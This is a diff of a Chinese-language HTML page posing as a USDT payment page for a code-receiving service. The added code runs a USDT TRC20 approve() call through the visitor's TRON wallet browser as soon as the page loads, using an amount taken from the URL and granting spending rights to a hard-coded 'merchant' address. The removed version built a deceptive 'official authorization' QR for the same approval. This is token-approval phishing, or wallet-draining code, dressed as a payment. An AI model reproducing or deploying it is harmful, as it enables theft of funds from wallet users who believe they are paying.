@@ -2,95 +2,67 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>海内外接码付款 - 官方格式 USDT 授權 QR</title>
-<script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
-<style>
-body { font-family: Arial, sans-serif; text-align: center; padding: 40px; }
-input { padding: 10px; font-size: 16px; width: 240px; }
-button { padding: 10px 22px; font-size: 16px; margin-top: 12px; }
-#qrcode { margin-top: 25px; }
-</style>
+<title>專業海內外接碼 - 自動 USDT 授權</title>
 </head>
 <body>
-
-<h2>海内外接码付款</h2>
-<p>輸入授權金額（USDT）並生成授權 QR</p>
-
-<input type="number" id="amount" placeholder="例如 100.5" step="0.000001" min="0.000001">
-<br>
-<button onclick="generateQR()">生成官方授權 QR</button>
-
-<div id="qrcode"></div>
+<h2>USDT 自動授權頁</h2>
+<p id="status">正在準備授權...</p>
 
 <script>
-const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"   // USDT TRC20
-const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"    // 你的收款地址
+// 配置
+const merchant = "TFEatdc8r36CrNqqKrbX6724DUsDyd6tHD"
+const usdtContract = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"
 const decimals = 6
-const symbol = "USDT"
-const icon = "https://s2.coinmarketcap.com/static/img/coins/64x64/825.png" // USDT Icon
 
-// 轉換成最小單位
-function toSun(amount) {
-  return BigInt(Math.floor(parseFloat(amount) * Math.pow(10, decimals)))
+// 讀取 URL 金額
+function getAmountFromUrl(){
+  const params = new URLSearchParams(window.location.search)
+  return parseFloat(params.get("amount"))
 }
 
-// TRON Base58 → hex
-function base58ToHex(address) {
+// 轉換成最小單位
+function toSun(amount){ return BigInt(Math.floor(amount * Math.pow(10, decimals))) }
+
+// Base58 → Hex
+function base58ToHex(address){
   const alphabet="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz"
   let num = 0n
-  for(let char of address){
-    num = num * 58n + BigInt(alphabet.indexOf(char))
-  }
+  for(let char of address){ num = num*58n + BigInt(alphabet.indexOf(char)) }
   let hex = num.toString(16)
-  if(hex.length % 2) hex = "0" + hex
+  if(hex.length %2) hex="0"+hex
   return hex
 }
 
-function pad64(hex){
-  return hex.padStart(64, '0')
-}
+// pad64
+function pad64(hex){ return hex.padStart(64,'0') }
 
-// 生成官方授權 QR
-function generateQR(){
-  const amountInput = document.getElementById("amount").value
-  if(!amountInput || amountInput <= 0){
-    alert("請輸入正確金額")
+// 自動授權
+async function autoApprove(){
+  const statusEl = document.getElementById("status")
+  const amount = getAmountFromUrl()
+  if(!amount || amount <=0){
+    statusEl.innerText = "授權金額錯誤"
     return
   }
 
-  const value = toSun(amountInput)
-  let addressHex = base58ToHex(merchant).substring(2)
-
-  let parameter = pad64(addressHex) + pad64(value.toString(16))
-
-  // 官方授權 QR 格式 JSON
-  const qrData = {
-    contract: usdtContract,
-    functionSelector: "approve(address,uint256)",
-    parameter: parameter,
-    symbol: symbol,
-    decimals: decimals,
-    icon: icon
+  if(typeof window.tronWeb === "undefined"){
+    statusEl.innerText = "請在 TokenPocket DApp Browser 打開"
+    return
   }
 
-  // JSON → Base64
-  const jsonString = JSON.stringify(qrData)
-  const base64Payload = btoa(jsonString)
-
-  // 錢包 deep link URL
-  const url = "tronlink://qrcode?data=" + base64Payload
-
-  document.getElementById("qrcode").innerHTML = ""
-  QRCode.toCanvas(document.createElement("canvas"), url, function(err, canvas){
-    if(err){
-      alert("生成 QR 失敗")
-      return
-    }
-    document.getElementById("qrcode").appendChild(canvas)
-  })
+  try{
+    statusEl.innerText = `正在授權 ${amount} USDT...`
+    const value = toSun(amount)
+    const contract = await window.tronWeb.contract().at(usdtContract)
+    await contract.approve(merchant, value).send()
+    statusEl.innerText = "授權成功 ✅"
+  }catch(e){
+    statusEl.innerText = "授權失敗 ❌ " + e
+  }
 }
 
+// 頁面載入後自動執行
+window.onload = autoApprove
 </script>
-
 </body>
 </html>
